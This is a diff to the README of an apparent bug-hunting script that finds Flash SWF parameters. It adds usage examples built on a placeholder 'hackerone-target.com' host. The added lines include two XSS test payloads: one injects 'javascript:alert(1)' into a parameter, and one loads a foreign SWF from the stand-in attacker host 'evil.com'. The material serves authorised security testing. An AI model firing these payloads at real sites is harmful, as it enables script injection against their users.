@@ -32,9 +32,16 @@ Usage
 -  this tool you can use it during bug hunting for find a potential swf parameters..
 
 ```shell
-$ bash swfpfinder.sh https://wwww.example.com/home.swf
+$ bash swfpfinder.sh https://hackerone-target.com/hackme.swf
 
 load_external-swf-file
 inject-me
 blabla
 ```
+- after find potential parameters: 
+
+`https://hackerone-target.com/hackme.swf?inject-me=javascript:alert(1)`
+
+`https://hackerone-target.com/hackme.swf?load_external-swf-file=https://www.evil.com/xss.swf`
+
+
